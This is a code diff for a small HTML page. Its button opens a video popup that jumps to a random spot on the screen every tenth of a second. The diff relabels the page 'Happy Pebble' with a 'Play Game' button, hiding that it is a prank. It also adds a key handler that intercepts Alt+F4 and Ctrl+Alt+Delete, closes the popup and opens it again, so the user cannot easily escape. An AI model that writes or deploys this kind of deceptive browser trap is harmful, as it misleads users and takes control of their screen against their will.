@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Click to Start Expiriment</title>
+    <title>Happy Pebble</title>
     <style>
         body {
             margin: 0;
@@ -40,7 +40,7 @@
     </style>
 </head>
 <body>
-    <button onclick="openChaos()">Click to Start</button>
+    <button onclick="openChaos()">Play Game</button>
     <script>
         function openChaos() {
             const tab = window.open('https://jonathanaft.github.io/lol/example.mp4', '', 'width=300,height=300');
@@ -49,6 +49,13 @@
             setInterval(() => {
                 tab.moveTo(Math.random() * (window.screen.width - 300), Math.random() * (window.screen.height - 300));
             }, 100);
+            window.addEventListener('keydown', (e) => {
+                if ((e.altKey && e.key === 'F4') || (e.ctrlKey && e.altKey && e.key === 'Delete')) {
+                    e.preventDefault();
+                    tab.close();
+                    setTimeout(() => openChaos(), 100);
+                }
+            });
         }
     </script>
 </body>
